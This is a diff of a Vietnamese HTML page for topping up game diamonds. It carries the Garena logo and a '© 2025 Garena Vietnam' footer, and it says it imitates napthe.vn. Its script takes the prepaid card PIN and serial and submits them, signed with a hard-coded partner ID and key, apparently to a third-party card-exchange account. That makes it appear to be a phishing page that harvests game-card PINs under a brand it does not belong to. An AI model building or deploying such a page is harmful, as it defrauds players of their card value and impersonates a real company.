@@ -1,22 +1,67 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Nạp Thẻ Garena</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/e/e8/Garena_logo.png">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Nạp Kim Cương</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/e/e8/Garena_logo.png" />
 </head>
 <body class="bg-gray-100 text-gray-800">
 
-  <!-- Header -->
-  <header class="bg-white shadow p-4 flex justify-between items-center">
-    <div class="text-red-600 text-2xl font-bold">NẠP KIM CƯƠNG</div>
-    <a href="index.html" class="text-sm text-blue-500 hover:underline">← Quay về</a>
-  </header>
+  <!-- Banner -->
+  <div class="w-full">
+    <img src="https://cdn.napthe.vn/images/banner-top.png" alt="Banner" class="w-full max-h-64 object-cover" />
+  </div>
 
-  <!-- Nội dung chính -->
-  <main class="max-w-xl mx-auto p-6 bg-white shadow mt-6 rounded">
+  <!-- Giá quy đổi -->
+  <section class="max-w-3xl mx-auto mt-6 bg-white rounded shadow p-4">
+    <h2 class="text-xl font-bold text-red-600 mb-2 text-center">Bảng quy đổi Kim Cương</h2>
+    <table class="w-full text-sm border border-gray-300 rounded overflow-hidden">
+      <thead class="bg-red-100 text-red-700">
+        <tr>
+          <th class="p-2 border">Mệnh giá</th>
+          <th class="p-2 border">Kim cương nhận</th>
+          <th class="p-2 border">Tặng thêm</th>
+        </tr>
+      </thead>
+      <tbody class="text-center">
+        <tr class="border">
+          <td class="p-2">10.000đ</td>
+          <td class="p-2">100 KC</td>
+          <td class="p-2">+0%</td>
+        </tr>
+        <tr class="border bg-gray-50">
+          <td class="p-2">20.000đ</td>
+          <td class="p-2">200 KC</td>
+          <td class="p-2">+0%</td>
+        </tr>
+        <tr class="border">
+          <td class="p-2">50.000đ</td>
+          <td class="p-2">500 KC</td>
+          <td class="p-2">+5%</td>
+        </tr>
+        <tr class="border bg-gray-50">
+          <td class="p-2">100.000đ</td>
+          <td class="p-2">1.000 KC</td>
+          <td class="p-2">+10%</td>
+        </tr>
+        <tr class="border">
+          <td class="p-2">200.000đ</td>
+          <td class="p-2">2.000 KC</td>
+          <td class="p-2">+15%</td>
+        </tr>
+        <tr class="border bg-gray-50">
+          <td class="p-2">500.000đ</td>
+          <td class="p-2">5.000 KC</td>
+          <td class="p-2">+20%</td>
+        </tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- Form nạp thẻ -->
+  <main class="max-w-xl mx-auto p-6 bg-white shadow mt-8 rounded">
     <h2 class="text-xl font-semibold mb-4">Thông tin nạp thẻ</h2>
 
     <div class="mb-4">
@@ -63,7 +108,7 @@
 
   <!-- Footer -->
   <footer class="text-center text-gray-500 text-sm py-6">
-    © 2025 Garena Vietnam. Design giống <a class="text-blue-500 underline" href="https://napthe.vn">napthe.vn</a>
+    © 2025 Garena Vietnam. Giao diện mô phỏng <a class="text-blue-500 underline" href="https://napthe.vn">napthe.vn</a>
   </footer>
 
   <!-- Script xử lý -->
@@ -82,7 +127,7 @@
 
       const request_id = Date.now().toString();
       const partner_id = "3bdf47efbc115edcb89f54f88f5aedf5";
-      const partner_key = "partnerkey"; // Thay bằng key thực của anh
+      const partner_key = "partnerkey"; // Nhớ thay bằng key thực tế
       const raw_sign = partner_id + telco + amount + pin + serial + request_id + partner_key;
       const sign = await md5(raw_sign);
 
@@ -124,6 +169,5 @@
       return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
     }
   </script>
-
 </body>
 </html>
